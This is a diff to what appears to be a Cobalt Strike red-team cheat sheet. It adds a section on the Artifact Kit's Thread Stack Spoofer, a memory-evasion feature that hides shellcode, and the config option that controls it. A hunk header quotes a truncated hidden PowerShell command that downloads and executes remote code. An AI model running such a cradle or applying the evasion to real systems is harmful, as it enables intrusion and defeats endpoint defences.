@@ -39,6 +39,7 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Artifact Kit](#artifact-kit)
     * [Mimikatz Kit](#mimikatz-kit)
     * [Sleep Mask Kit](#sleep-mask-kit)
+    * [Thread Stack Spoofer](#thread-stack-spoofer)
 * [Beacon Object Files](#beacon-object-files)
 * [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
 * [References](#references)
@@ -429,6 +430,11 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 
 Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.
 
+### Thread Stack Spoofer
+
+> An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.
+
+Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option `artifactkit_stack_spoof` in the config file `arsenal_kit.config`.
 
 ## Beacon Object Files
 
